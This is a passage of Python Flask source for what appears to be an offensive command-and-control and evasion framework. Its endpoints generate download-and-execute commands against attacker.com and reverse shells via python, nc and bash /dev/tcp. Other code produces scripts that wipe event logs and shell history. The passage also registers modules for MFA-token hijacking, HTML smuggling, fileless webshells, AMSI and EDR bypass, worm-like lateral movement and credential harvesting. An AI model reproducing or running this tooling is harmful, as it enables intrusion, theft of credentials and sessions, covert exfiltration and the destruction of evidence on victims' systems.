        {'name': 'wget', 'os': 'linux', 'functions': ['download'], 'risk': 'medium'},
        {'name': 'python', 'os': 'linux', 'functions': ['execute', 'reverse_shell'], 'risk': 'high'},
        {'name': 'nc', 'os': 'linux', 'functions': ['reverse_shell', 'bind_shell', 'transfer'], 'risk': 'critical'},
        {'name': 'bash', 'os': 'linux', 'functions': ['execute', 'reverse_shell'], 'risk': 'high'},
    ]
    return jsonify(binaries)


@evasion_bp.route('/api/lotl/generate', methods=['POST'])
def lotl_generate():
    """Generate LOTL command"""
    data = request.get_json() or {}
    binary = data.get('binary', 'certutil.exe')
    function = data.get('function', 'download')
    target = data.get('target', 'http://attacker.com/payload.exe')
    output = data.get('output', 'C:\\Windows\\Temp\\payload.exe')
    
    commands = {
        'certutil.exe': {
            'download': f'certutil.exe -urlcache -split -f {target} {output}',
            'encode': f'certutil.exe -encode {output} {output}.b64',
            'decode': f'certutil.exe -decode {output}.b64 {output}'
        },
        'bitsadmin.exe': {
            'download': f'bitsadmin /transfer job /download /priority high {target} {output}',
            'execute': f'bitsadmin /create 1 & bitsadmin /addfile 1 {target} {output} & bitsadmin /RESUME 1'
        },
        'mshta.exe': {
            'execute': f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{target}"":close")',
            'proxy': f'mshta {target}'
        },
        'powershell.exe': {
            'download': f'powershell -c "IWR -Uri {target} -OutFile {output}"',
            'execute': f'powershell -ep bypass -c "IEX(IWR {target})"',
            'encode': f'powershell -enc {base64.b64encode(target.encode()).decode()}'
        },
        'curl': {
            'download': f'curl -o {output} {target}',
            'upload': f'curl -X POST -d @{output} {target}',
            'exfil': f'curl -X POST -F "file=@{output}" {target}'
        },
        'wget': {
            'download': f'wget -O {output} {target}'
        },
        'python': {
            'execute': f'python -c "import urllib.request; exec(urllib.request.urlopen(\'{target}\').read())"',
            'reverse_shell': f'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{target}\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"'
        },
        'nc': {
            'reverse_shell': f'nc -e /bin/sh {target} 4444',
            'bind_shell': f'nc -lvp 4444 -e /bin/sh',
            'transfer': f'nc -w 3 {target} 4444 < {output}'
        },
        'bash': {
            'execute': f'bash -c "{target}"',
            'reverse_shell': f'bash -i >& /dev/tcp/{target}/4444 0>&1'
        }
    }
    
    cmd = commands.get(binary, {}).get(function, 'Command not found')
    
    return jsonify({
        'binary': binary,
        'function': function,
        'command': cmd,
        'opsec_notes': 'Use with caution - may trigger EDR alerts'
    })


# ============================================================
# FORENSIC CLEANUP
# ============================================================

@evasion_bp.route('/cleanup/')
def cleanup_page():
    """Forensic cleanup page"""
    return render_template('cleanup.html')


@evasion_bp.route('/api/cleanup/artifacts')
def cleanup_artifacts():
    """Get list of forensic artifacts to clean"""
    artifacts = [
        {'category': 'logs', 'name': 'Windows Event Logs', 'path': 'C:\\Windows\\System32\\winevt\\Logs\\', 'risk': 'high'},
        {'category': 'logs', 'name': 'PowerShell History', 'path': '%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\', 'risk': 'critical'},
        {'category': 'logs', 'name': 'Linux Auth Log', 'path': '/var/log/auth.log', 'risk': 'high'},
        {'category': 'logs', 'name': 'Linux Syslog', 'path': '/var/log/syslog', 'risk': 'high'},
        {'category': 'logs', 'name': 'Apache Access Log', 'path': '/var/log/apache2/access.log', 'risk': 'medium'},
        {'category': 'prefetch', 'name': 'Windows Prefetch', 'path': 'C:\\Windows\\Prefetch\\', 'risk': 'high'},
        {'category': 'registry', 'name': 'UserAssist', 'path': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist', 'risk': 'high'},
        {'category': 'registry', 'name': 'RecentDocs', 'path': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs', 'risk': 'medium'},
        {'category': 'registry', 'name': 'RunMRU', 'path': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU', 'risk': 'medium'},
        {'category': 'browser', 'name': 'Chrome History', 'path': '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History', 'risk': 'medium'},
        {'category': 'browser', 'name': 'Firefox History', 'path': '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\places.sqlite', 'risk': 'medium'},
        {'category': 'temp', 'name': 'Windows Temp', 'path': 'C:\\Windows\\Temp\\', 'risk': 'low'},
        {'category': 'temp', 'name': 'User Temp', 'path': '%TEMP%\\', 'risk': 'low'},
        {'category': 'mft', 'name': 'MFT Records', 'path': '$MFT', 'risk': 'critical'},
        {'category': 'usnjrnl', 'name': 'USN Journal', 'path': '$UsnJrnl', 'risk': 'critical'},
    ]
    return jsonify(artifacts)


@evasion_bp.route('/api/cleanup/generate', methods=['POST'])
def cleanup_generate():
    """Generate cleanup script"""
    data = request.get_json() or {}
    targets = data.get('targets', [])
    os_type = data.get('os', 'windows')
    
    if os_type == 'windows':
        script = '@echo off\n'
        script += 'echo [*] Starting forensic cleanup...\n'
        
        for target in targets:
            if target == 'event_logs':
                script += 'wevtutil cl Security\n'
                script += 'wevtutil cl System\n'
                script += 'wevtutil cl Application\n'
                script += 'wevtutil cl "Windows PowerShell"\n'
            elif target == 'prefetch':
                script += 'del /f /q C:\\Windows\\Prefetch\\*.pf\n'
            elif target == 'temp':
                script += 'del /f /q /s %TEMP%\\*\n'
                script += 'del /f /q /s C:\\Windows\\Temp\\*\n'
            elif target == 'powershell_history':
                script += 'del /f /q %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n'
            elif target == 'recent':
                script += 'del /f /q %APPDATA%\\Microsoft\\Windows\\Recent\\*\n'
                
        script += 'echo [+] Cleanup complete!\n'
        
    else:  # Linux
        script = '#!/bin/bash\n'
        script += 'echo "[*] Starting forensic cleanup..."\n'
        
        for target in targets:
            if target == 'auth_log':
                script += 'cat /dev/null > /var/log/auth.log\n'
            elif target == 'syslog':
                script += 'cat /dev/null > /var/log/syslog\n'
            elif target == 'bash_history':
                script += 'cat /dev/null > ~/.bash_history\n'
                script += 'history -c\n'
            elif target == 'tmp':
                script += 'rm -rf /tmp/*\n'
            elif target == 'wtmp':
                script += 'cat /dev/null > /var/log/wtmp\n'
            elif target == 'lastlog':
                script += 'cat /dev/null > /var/log/lastlog\n'
                
        script += 'echo "[+] Cleanup complete!"\n'
    
    return jsonify({
        'script': script,
        'os': os_type,
        'targets_cleaned': len(targets)
    })


# ============================================================
# OPSEC MODULE
# ============================================================

@evasion_bp.route('/opsec/')
def opsec_page():
    """OpSec configuration page"""
    return render_template('opsec.html')


@evasion_bp.route('/api/opsec/status')
def opsec_status():
    """Get current OpSec status"""
    return jsonify({
        'level': 'paranoid',
        'checks': {
            'vm_detection': True,
            'debugger_detection': True,
            'sandbox_detection': True,
            'network_monitoring': True,
            'process_hollowing': False,
            'timestomping': True
        },
        'recommendations': [
            'Enable process hollowing for better evasion',
            'Consider using encrypted C2 channels',
            'Implement jitter in beacon intervals'
        ]
    })


@evasion_bp.route('/api/opsec/check', methods=['POST'])
def opsec_check():
    """Run OpSec checks"""
    data = request.get_json() or {}
    check_type = data.get('type', 'all')
    
    results = {
        'vm_detection': {
            'status': 'pass',
            'indicators': [],
            'confidence': 0
        },
        'debugger_detection': {
            'status': 'pass',
            'indicators': [],
            'confidence': 0
        },
        'sandbox_detection': {
            'status': 'pass',
            'indicators': [],
            'confidence': 0
        },
        'network_anomalies': {
            'status': 'pass',
            'indicators': [],
            'confidence': 0
        }
    }
    
    # Simulated checks
    import random
    for check in results:
        if random.random() > 0.7:
            results[check]['status'] = 'warning'
            results[check]['confidence'] = random.randint(30, 70)
            results[check]['indicators'].append('Suspicious behavior detected')
    
    return jsonify({
        'results': results,
        'overall_status': 'safe' if all(r['status'] == 'pass' for r in results.values()) else 'warning',
        'timestamp': datetime.now().isoformat()
    })


# ============================================================
# GHOST PROTOCOL MODULES  (recent commits -> UI)
# ============================================================
import json as _json
from dataclasses import is_dataclass, asdict as _asdict
from enum import Enum as _Enum


def _clean_ghost(obj, _depth=0):
    """Recursively convert module results into JSON-safe structures."""
    if _depth > 6:
        return "..."
    if obj is None or isinstance(obj, (bool, int, float, str)):
        return obj
    if isinstance(obj, bytes):
        s = obj[:400]
        return {
            "is_bytes": True,
            "len": len(obj),
            "preview_hex": s.hex(),
            "preview_ascii": "".join(chr(c) if 32 <= c < 127 else "." for c in s),
        }
    if isinstance(obj, (list, tuple, set)):
        return [_clean_ghost(x, _depth + 1) for x in obj]
    if isinstance(obj, dict):
        return {str(k): _clean_ghost(v, _depth + 1) for k, v in obj.items()}
    if isinstance(obj, _Enum):
        return {"name": getattr(obj, "name", None), "value": getattr(obj, "value", None)}
    if is_dataclass(obj):
        try:
            return {k: _clean_ghost(v, _depth + 1) for k, v in _asdict(obj).items()}
        except Exception:
            pass
    return str(obj)


def _run_aitm(inputs):
    from evasion.aitm_proxy import create_aitm_proxy
    platform = str(inputs.get("platform", "office365")).lower()
    eng = create_aitm_proxy(platform=platform, offline=True)
    return {"platform": platform, "injection_script": eng.generate_injection_script(), "summary": eng.summary()}


def _run_ghost_watchdog(inputs):
    from evasion.ghost_watchdog import generate_ebpf_watchdog_c, FastCGIWatchdog
    watch_comm = inputs.get("watch_comm", "php-fpm")
    src = generate_ebpf_watchdog_c(watch_comm=watch_comm)
    support = FastCGIWatchdog().check_ebpf_support()
    return {"watch_comm": watch_comm, "ebpf_source_len": len(src), "ebpf_source_preview": src[:600], "ebpf_support": support}


def _run_html_smuggler(inputs):
    import base64
    from evasion.html_smuggler import _build_js_loader
    payload = inputs.get("payload", "SECRET-BEACON-BINARY-DATA-HERE")
    filename = inputs.get("filename", "beacon.exe")
    obfuscation = inputs.get("obfuscation", "medium")
    chunks = [payload[i:i + 16] for i in range(0, len(payload), 16)] or [payload]
    b64chunks = [base64.b64encode(c.encode()).decode() for c in chunks]
    html = _build_js_loader(b64chunks, filename, obfuscation)
    return {"filename": filename, "obfuscation": obfuscation, "loader_snippet": html}


def _run_k8s_ghost_pivot(inputs):
    from evasion.k8s_ghost_pivot import generate_propagation_script
    trigger = inputs.get("trigger_path", "/dev/shm/ghost.trigger")
    host = inputs.get("fpm_host", "127.0.0.1")
    port = int(inputs.get("fpm_port", 9000))
    return {"trigger_path": trigger, "fpm_host": host, "fpm_port": port,
            "propagation_script": generate_propagation_script(trigger, host, port)}


def _run_k8s_kraken(inputs):
    from evasion.k8s_kraken_v3 import C2NoiseGenerator
    g = C2NoiseGenerator()
    count = max(1, int(inputs.get("count", 3)))
    events = []
    for _ in range(count):
        events += [g.generate_http_get(), g.generate_dns_txt(), g.generate_tls_heartbeat()]
    return {"count": count, "events": events}


def _run_smb_cloaker(inputs):
    from evasion.smb_rpc_cloaker import SMBRPCCloaker
    data = inputs.get("data", "SMB negotiate data with embedded C2 beacon bytes").encode()
    count = int(inputs.get("count", 3))
    c = SMBRPCCloaker()
    frags, pad = c.fragment_smb_packet(data)
    junk = c.generate_smb_junk_traffic("10.0.0.5", count)
    return {
        "fragment_count": len(frags),
        "fragments": [f.__dict__ if hasattr(f, "__dict__") else f for f in frags],
        "cloaked_padding_len": len(pad),
        "junk_traffic_count": len(junk),
    }


def _run_web_logic(inputs):
    from evasion.web_logic_hijacker import WebLogicHijacker
    body = inputs.get("body", "username=admin&password=Secret123").encode()
    url = inputs.get("url", "https://mail.corp.local/login")
    h = WebLogicHijacker(offline=True)
    events = h.inspect_body(body, url=url, method="POST")
    return {"intercepted_count": len(events), "events": events, "stats": h._stats, "report": h.report()}


def _run_fileless(inputs):
    from evasion.fileless_webshell import FastCGIInjection
    host = inputs.get("host", "127.0.0.1")
    port = int(inputs.get("port", 9000))
    script = inputs.get("script", "/var/www/html/index.php")
    inj = FastCGIInjection(host=host, port=port, script_filename=script)
    shell = inj.generate_ghost_shell()
    return {"host": host, "port": port, "script": script, "ghost_shell_snippet": shell[:600]}


def _run_in_request_exfil(inputs):
    from evasion.in_request_exfil import ProtocolExfil, ExfilChannel
    ch = str(inputs.get("channel", "WEBSOCKET")).upper()
    ch_enum = getattr(ExfilChannel, ch, ExfilChannel.WEBSOCKET)
    data = inputs.get("data", "SECRET-C2-PAYLOAD-XYZ").encode()
    ex = ProtocolExfil(channel=ch_enum)
    recovered = ex.roundtrip(data)
    return {
        "channel": ch_enum.name,
        "original_len": len(data),
        "recovered_match": recovered == data,
        "frame_count": len(ex.exfiltrate(data)),
    }


def _run_anti_forensics(inputs):
    from evasion.anti_forensics_rotation import generate_beacon_id, secure_wipe
    buf = bytearray(inputs.get("material", "SECRET-KEY-MATERIAL-TO-WIPE").encode())
    secure_wipe(buf)
    return {"new_beacon_id": generate_beacon_id(), "wiped_buffer_hex": buf.hex()}


def _run_api_sequence(inputs):
    from evasion.api_sequence_spoofing import APISequenceSpoofer
    template = inputs.get("template", "svchost_heartbeat")
    calls = [c.strip() for c in inputs.get("real_calls",
             "VirtualAlloc,WriteProcessMemory,CreateRemoteThread").split(",") if c.strip()]
    sp = APISequenceSpoofer(template=template)
    plan = sp.plan(calls)
    return {"template": template, "plan_len": len(plan), "plan": plan, "benign_score": sp.benign_score()}


def _run_behavioral(inputs):
    from evasion.behavioral_mimicry import GANTrafficGenerator
    n = int(inputs.get("num_events", 5))
    g = GANTrafficGenerator()
    pats = g.generate_traffic_pattern(n)
    return {"patterns": pats, "optimal_timing": list(g.get_optimal_timing())}


def _run_c2_entropy(inputs):
    from evasion.c2_traffic_entropy import C2TrafficEntropy
    carrier = inputs.get("carrier", "png")
    data = inputs.get("data", "GET /admin HTTP/1.1\r\nHost: c2.example.com").encode()
    beacon_id = inputs.get("beacon_id", "B-2026-GHOST")
    e = C2TrafficEntropy(beacon_id=beacon_id, carrier=carrier)
    carrier_bytes, ctype = e.embed(data)
    recovered = e.extract(carrier_bytes, ctype)
    return {"beacon_id": beacon_id, "carrier_type": ctype, "carrier_len": len(carrier_bytes),
            "recovered_match": recovered == data}


def _run_peb_eat(inputs):
    from evasion.peb_eat_walker import PEBModuleFinder
    mod = inputs.get("module", "kernel32.dll")
    f = PEBModuleFinder()
    try:
        base = f.get_module_base(mod)
        winhttp = f.resolve_winhttp_functions()
        return {"module": mod,
                "module_base": hex(base) if isinstance(base, int) else base,
                "winhttp_functions": {k: hex(v) if isinstance(v, int) else v for k, v in winhttp.items()}}
    except Exception as ex:
        return {"module": mod, "note": "PEB/EAT walking requires a Windows target process", "error": str(ex)}


def _run_call_stack(inputs):
    from evasion.call_stack_spoofing import CallStackSpoofer
    s = CallStackSpoofer()
    return {"status": s.get_status()}


def _run_hwbp_amsi(inputs):
    from evasion.hwbp_amsi_bypass import get_hwbp_amsi_bypass, is_amsi_hwbp_active
    b = get_hwbp_amsi_bypass()
    return {"status": b.get_status(), "active": is_amsi_hwbp_active()}


def _run_auto_reporting(inputs):
    from evasion.auto_reporting import AutoReporter, OperationPackage
    operator = inputs.get("operator", "Therso")
    domain = inputs.get("target_domain", "corp.local")
    pkg = OperationPackage(scan_id="op-ghost-2026", operator=operator,
                            target_domain=domain, campaign="Ghost Protocol v2.6")
    pkg.add_lateral_result("DC01", "psexec", "ADMIN\\svc-account", success=True)
    pkg.add_credential("ADMIN\\svc-account", "P@ssw0rd!", domain=domain, cred_type="password")
    pkg.add_web_hijack_event("login", "https://mail.corp.local", {"user": "admin", "pass": "x"})
    r = AutoReporter()
    try:
        md = r.generate_markdown_summary(pkg)
    except Exception as ex:
        md = "(markdown unavailable offline: %s)" % ex
    return {"report_preview": md[:1500], "scan_id": pkg.scan_id}


def _run_autonomous_hunter(inputs):
    from evasion.autonomous_hunter import AutonomousDecisionEngine, HunterMode
    mode = str(inputs.get("mode", "WORM")).upper()
    m = getattr(HunterMode, mode, HunterMode.WORM)
    eng = AutonomousDecisionEngine(mode=m)
    ranked = eng.rank_targets([])
    return {"mode": eng.mode.name, "ranked_targets": ranked,
            "available_modes": [x.name for x in HunterMode]}


def _run_advanced_waf_bypass(inputs):
    from evasion.advanced_waf_bypass import run_advanced_waf_bypass
    return run_advanced_waf_bypass(inputs)


def _run_cred_harvest(inputs):
    from tools.cred_harvest import run_cred_harvest
    return run_cred_harvest(inputs)


_GHOST_MODULES = [
    {
        "slug": "aitm-proxy", "name": "AiTM Proxy", "icon": "fa-user-secret", "color": "red",
        "subtitle": "Adversary-in-The-Middle credential & session hijack",
        "description": "Reverse proxy that intercepts MFA tokens and session cookies, then replays them against cloud identity providers to seize live sessions.",
        "capabilities": ["Reverse proxy rewrite engine", "Session cookie & bearer token replay",
                         "JavaScript injector for credential capture", "Platform-specific configs (O365, Okta, Azure)"],
        "inputs": [
            {"name": "platform", "label": "Identity Platform", "type": "select", "default": "office365", "options": ["office365", "okta", "azure"]},
        ], "run": _run_aitm, "offline": True,
    },
    {
        "slug": "html-smuggler", "name": "HTML Smuggler", "icon": "fa-box-open", "color": "orange",
        "subtitle": "Chunked HTML smuggling loader generator",
        "description": "Builds HTML/JS loaders that reassemble an encrypted beacon payload entirely in the browser, defeating content-inspection gateways.",
        "capabilities": ["Base64 chunk splitting", "Obfuscated JS loader", "Decoy/legit page wrapper", "Multiple smuggle templates"],
        "inputs": [
            {"name": "payload", "label": "Beacon Payload", "type": "text", "default": "SECRET-BEACON-BINARY-DATA-HERE"},
            {"name": "filename", "label": "Drop Filename", "type": "text", "default": "beacon.exe"},
            {"name": "obfuscation", "label": "Obfuscation", "type": "select", "default": "medium", "options": ["low", "medium", "high"]},
        ], "run": _run_html_smuggler, "offline": True,
    },
    {
        "slug": "k8s-ghost-pivot", "name": "K8s Ghost Pivot", "icon": "fa-dharmachakra", "color": "blue",
        "subtitle": "Container-to-container worm pivot over shared volumes",
        "description": "Detects pods sharing volumes, plans worm-like pivots, and generates ephemeral re-arming scripts and DaemonSets that re-inject the in-memory hook.",
        "capabilities": ["Shared-volume pod discovery", "Worm-style pivot planning", "Ephemeral payload planting", "DaemonSet YAML generation"],
        "inputs": [
            {"name": "trigger_path", "label": "Trigger Path", "type": "text", "default": "/dev/shm/ghost.trigger"},
            {"name": "fpm_host", "label": "FPM Host", "type": "text", "default": "127.0.0.1"},
            {"name": "fpm_port", "label": "FPM Port", "type": "text", "default": "9000"},
        ], "run": _run_k8s_ghost_pivot, "offline": True,
    },
    {
        "slug": "k8s-kraken-v3", "name": "K8s Kraken v3", "icon": "fa-water", "color": "indigo",
        "subtitle": "C2 traffic noise injection for Kubernetes",
        "description": "Generates realistic benign-looking HTTP/DNS/TLS noise to mask C2 beacon traffic inside cluster east-west and ingress flows.",
        "capabilities": ["HTTP GET/POST noise", "DNS TXT query noise", "TLS heartbeat shaping", "Evasion scoring & stats"],
        "inputs": [
            {"name": "count", "label": "Noise Bursts", "type": "text", "default": "3"},
        ], "run": _run_k8s_kraken, "offline": True,
    },
    {
        "slug": "smb-rpc-cloaker", "name": "SMB/RPC Cloaker", "icon": "fa-network-wired", "color": "pink",
        "subtitle": "Fragment & pad SMB/RPC traffic to evade NDR",
        "description": "Splits SMB packets, pads RPC calls with benign appearances, obfuscates pipe names and injects timing jitter to hide Impacket tooling.",
        "capabilities": ["SMB packet fragmentation", "Benign RPC padding", "Named-pipe obfuscation", "Impacket command wrapping & jitter"],
        "inputs": [
            {"name": "data", "label": "C2 Payload Bytes", "type": "text", "default": "SMB negotiate data with embedded C2 beacon bytes"},
            {"name": "count", "label": "Junk Traffic Count", "type": "text", "default": "3"},
        ], "run": _run_smb_cloaker, "offline": True,
    },
    {
        "slug": "web-logic-hijacker", "name": "Web Logic Hijacker", "icon": "fa-code", "color": "rose",
        "subtitle": "Intercept credentials & forward to Monolith C2",
        "description": "Inspects in-flight request bodies for credentials and sensitive patterns, then transparently forwards matched events to the Monolith C2 forwarder.",
        "capabilities": ["Pattern-based body inspection", "Credential interception", "C2 event forwarding", "Built-in pattern library"],
        "inputs": [
            {"name": "body", "label": "POST Body", "type": "text", "default": "username=admin&password=Secret123"},
            {"name": "url", "label": "Target URL", "type": "text", "default": "https://mail.corp.local/login"},
        ], "run": _run_web_logic, "offline": True,
    },
    {
        "slug": "fileless-webshell", "name": "Fileless WebShell", "icon": "fa-ghost", "color": "red",
        "subtitle": "Fileless FastCGI in-memory PHP webshell",
        "description": "Builds a request that drops an encrypted, in-memory PHP webshell into a FastCGI/PHP-FPM worker without writing a file to disk.",
        "capabilities": ["FastCGI record crafting", "Encrypted in-memory payload", "Diskless PHP execution", "Re-injection support"],
        "inputs": [
            {"name": "host", "label": "FPM Host", "type": "text", "default": "127.0.0.1"},
            {"name": "port", "label": "FPM Port", "type": "text", "default": "9000"},
            {"name": "script", "label": "Script Filename", "type": "text", "default": "/var/www/html/index.php"},
        ], "run": _run_fileless, "offline": True,
    },
    {
        "slug": "in-request-exfil", "name": "In-Request Exfil", "icon": "fa-file-export", "color": "rose",
        "subtitle": "Covert exfiltration inside legit protocol frames",
        "description": "Fragments payloads into WebSocket frames, HTTP/2 streams or DNS queries so exfiltration rides inside ordinary application traffic.",
        "capabilities": ["WebSocket frame tunneling", "HTTP/2 stream smuggling", "Fragmentation & reconstruction", "In-memory roundtrip verification"],
        "inputs": [
            {"name": "data", "label": "Data", "type": "text", "default": "SECRET-C2-PAYLOAD-XYZ"},
            {"name": "channel", "label": "Channel", "type": "select", "default": "WEBSOCKET", "options": ["WEBSOCKET", "HTTP2", "DNS"]},
        ], "run": _run_in_request_exfil, "offline": True,
    },
    {
        "slug": "anti-forensics-rotation", "name": "Anti-Forensics Rotation", "icon": "fa-sync", "color": "amber",
        "subtitle": "24h rotation of beacon ID & all keys",
        "description": "Periodically rotates the beacon identity and all cryptographic material, with signed envelopes to keep the backend in sync and break forensic correlation.",
        "capabilities": ["Beacon ID rotation", "Key & task-crypto rotation", "Signed rotation envelopes", "Tamper verification"],
        "inputs": [
            {"name": "material", "label": "Key Material To Wipe", "type": "text", "default": "SECRET-KEY-MATERIAL-TO-WIPE"},
        ], "run": _run_anti_forensics, "offline": True,
    },
    {
        "slug": "api-sequence-spoofing", "name": "API Sequence Spoofing", "icon": "fa-random", "color": "violet",
        "subtitle": "Blend malicious API calls into benign behaviour",
        "description": "Wraps real malicious API call sequences with chaff that mimics legitimate process behaviour (svchost, explorer, lsass) to defeat EDR sequence analysis.",
        "capabilities": ["Template-based chaff injection", "Benign score modelling", "Sequence scoring", "Multi-template support"],
        "inputs": [
            {"name": "real_calls", "label": "Real API Calls (csv)", "type": "text", "default": "VirtualAlloc,WriteProcessMemory,CreateRemoteThread"},
            {"name": "template", "label": "Template", "type": "select", "default": "svchost_heartbeat", "options": ["svchost_heartbeat", "explorer_browse", "lsass_query", "wmi_poll"]},
        ], "run": _run_api_sequence, "offline": True,
    },
    {
        "slug": "behavioral-mimicry", "name": "Behavioral Mimicry", "icon": "fa-theater-masks", "color": "fuchsia",
        "subtitle": "GAN-driven traffic & human behaviour mimicry",
        "description": "Uses a GAN to generate traffic patterns and simulates human mouse/keyboard cadence to defeat behavioural analytics and UEBA.",
        "capabilities": ["GAN traffic generation", "Optimal timing estimation", "Human mouse simulation", "Typing cadence modelling"],
        "inputs": [
            {"name": "num_events", "label": "Pattern Count", "type": "text", "default": "5"},
        ], "run": _run_behavioral, "offline": True,
    },
    {
        "slug": "c2-traffic-entropy", "name": "C2 Traffic Entropy", "icon": "fa-wave-square", "color": "teal",
        "subtitle": "Hide C2 inside PNG / HTML carrier entropy",
        "description": "Embeds encrypted C2 envelopes inside the entropy of PNG images or HTML documents so beacons blend into normal web traffic.",
        "capabilities": ["PNG carrier embedding", "HTML carrier embedding", "Auto carrier selection", "Roundtrip extraction"],
        "inputs": [
            {"name": "data", "label": "Data", "type": "text", "default": "GET /admin HTTP/1.1\r\nHost: c2.example.com"},
            {"name": "carrier", "label": "Carrier", "type": "select", "default": "png", "options": ["png", "html", "auto"]},
            {"name": "beacon_id", "label": "Beacon ID", "type": "text", "default": "B-2026-GHOST"},
        ], "run": _run_c2_entropy, "offline": True,
    },
    {
        "slug": "peb-eat-walker", "name": "PEB/EAT Walker", "icon": "fa-sitemap", "color": "lime",
        "subtitle": "Manual PEB/EAT resolution (no import table)",
        "description": "Walks the PEB to locate module bases and parses the Export Address Table to resolve Win32 functions, avoiding the Import Address Table entirely.",
        "capabilities": ["PEB module base resolution", "EAT function resolution", "winhttp function resolution", "Import-table-free loading"],
        "inputs": [
            {"name": "module", "label": "Module Name", "type": "text", "default": "kernel32.dll"},
        ], "run": _run_peb_eat, "offline": False,
    },
    {
        "slug": "call-stack-spoofing", "name": "Call Stack Spoofing", "icon": "fa-layer-group", "color": "sky",
        "subtitle": "Legitimate return addresses on the call stack",
        "description": "Spoofs the call stack with addresses from legitimate modules so memory scans and stack-walk detections see only benign callers.",
        "capabilities": ["Legitimate address collection", "Thread context spoofing", "Encrypted address storage", "Status reporting"],
        "inputs": [], "run": _run_call_stack, "offline": False,
    },
    {
        "slug": "hwbp-amsi-bypass", "name": "HWBP AMSI Bypass", "icon": "fa-microchip", "color": "red",
        "subtitle": "Hardware-breakpoint AMSI/AV bypass via VEH",
        "description": "Uses hardware debug registers (DR0) and a Vectored Exception Handler to intercept and neutralize AMSI/AV scans at the point of API invocation.",
        "capabilities": ["Hardware breakpoint (DR0) set/clear", "Vectored Exception Handler", "AMSI context resolution", "Active-state probing"],
        "inputs": [], "run": _run_hwbp_amsi, "offline": False,
    },
    {
        "slug": "auto-reporting", "name": "Auto-Reporting", "icon": "fa-file-contract", "color": "emerald",
        "subtitle": "Zero-touch Red Team assessment reports",
        "description": "Ingests raw operation telemetry (lateral moves, credentials, web hijacks, C2 beacons) and produces customer-ready HTML/PDF/Markdown/JSON reports.",
        "capabilities": ["Operation package normalisation", "Markdown executive summary", "MITRE ATT&CK mapping", "Multi-format export"],
        "inputs": [
            {"name": "operator", "label": "Operator", "type": "text", "default": "Therso"},
            {"name": "target_domain", "label": "Target Domain", "type": "text", "default": "corp.local"},
        ], "run": _run_auto_reporting, "offline": True,
    },
    {
        "slug": "autonomous-hunter", "name": "Autonomous Hunter", "icon": "fa-robot", "color": "purple",
        "subtitle": "Self-driving lateral movement & pivoting",
        "description": "Discovers AD assets, ranks targets with a decision engine, and auto-pivots through the network harvesting credentials into an encrypted vault.",
        "capabilities": ["AD computer discovery", "Target ranking engine", "Auto-pivot chains", "Encrypted credential vault"],
        "inputs": [
            {"name": "mode", "label": "Hunter Mode", "type": "select", "default": "WORM", "options": ["WORM", "SAFE", "AGGRESSIVE"]},
        ], "run": _run_autonomous_hunter, "offline": True,
    },
    {
        "slug": "advanced-waf-bypass", "name": "Advanced WAF Bypass", "icon": "fa-shield-alt", "color": "rose",
        "subtitle": "HTTP/2 QUIC Smuggling & GraphQL Tunneling",
        "description": "Bypass Cloudflare/Akamai/Imperva/AWS WAF v3/v4 via HTTP/2 stream desync, CL/TE smuggling, and GraphQL Base64 multipart tunneling.",
        "capabilities": ["HTTP/2 stream smuggling", "CL/TE confusion", "GraphQL multipart tunneling", "WAF profile targeting"],
        "inputs": [
            {"name": "target_host", "label": "Target Host", "type": "text", "default": "target.corp.local"},
            {"name": "target_port", "label": "Target Port", "type": "text", "default": "443"},
            {"name": "web_path", "label": "Web Path", "type": "text", "default": "/api/graphql"},
            {"name": "waf_profile", "label": "WAF Profile", "type": "select", "default": "cloudflare", "options": ["cloudflare", "akamai", "imperva", "aws_waf"]},
            {"name": "payload", "label": "Attack Payload", "type": "text", "default": "MONOLITH-WAF-BYPASS-PAYLOAD-2026"},
        ], "run": _run_advanced_waf_bypass, "offline": True,
    },
    {
        "slug": "cred-harvest", "name": "Cred Harvest", "icon": "fa-key", "color": "amber",
        "subtitle": "OAuth & OIDC Session Hijacking Kit",
        "description": "Generates phishing/redirect payloads to steal OAuth/OIDC authorization codes and refresh tokens, bypassing MFA at the identity layer.",
        "capabilities": ["OAuth phishing artifact", "Open redirect + OAuth chain", "Token parse & replay", "MFA bypass simulation"],
        "inputs": [
            {"name": "platform", "label": "Identity Platform", "type": "select", "default": "m365", "options": ["m365", "okta", "azure_ad"]},
            {"name": "c2_endpoint", "label": "C2 Endpoint", "type": "text", "default": "https://c2.corp.local/ingest"},
            {"name": "wrapper_url", "label": "Wrapper URL", "type": "text", "default": "https://docs.corp.local/s/q3-report"},
        ], "run": _run_cred_harvest, "offline": True,
    },
    {
        "slug": "ghost-watchdog", "name": "Ghost Watchdog", "icon": "fa-eye", "color": "cyan",
        "subtitle": "Keep the in-memory webshell alive",
        "description": "Monitors the FastCGI/PHP-FPM worker and re-injects the in-memory webshell if the process restarts or the hook is cleaned, using eBPF or polling.",
        "capabilities": ["eBPF watchdog source gen", "FastCGI reinjection", "Poll-mode fallback", "Injection reporting"],
        "inputs": [
            {"name": "watch_comm", "label": "Watch Comm", "type": "text", "default": "php-fpm"},
        ], "run": _run_ghost_watchdog, "offline": True,
    },
]


def _get_ghost_module(slug):
    for m in _GHOST_MODULES:
        if m["slug"] == slug:
            return m
    return None


def _make_ghost_page(slug):
    def page():
        m = _get_ghost_module(slug)
        if not m:
            return jsonify({"error": "unknown module"}), 404
        return render_template("ghost_module.html", **m, now=datetime.now().strftime('%H:%M:%S'))
    return page


def _make_ghost_run(slug):
    def run():
        m = _get_ghost_module(slug)
        if not m:
            return jsonify({"success": False, "error": "unknown module"}), 404
        try:
            data = request.get_json(silent=True) or {}
            result = m["run"](data)
            return jsonify({"success": True, "result": _clean_ghost(result)})
        except Exception as ex:
            logger.exception("Ghost module run error: %s", slug)
            return jsonify({"success": False, "error": str(ex)}), 500
    return run


for _m in _GHOST_MODULES:
    _slug = _m["slug"]
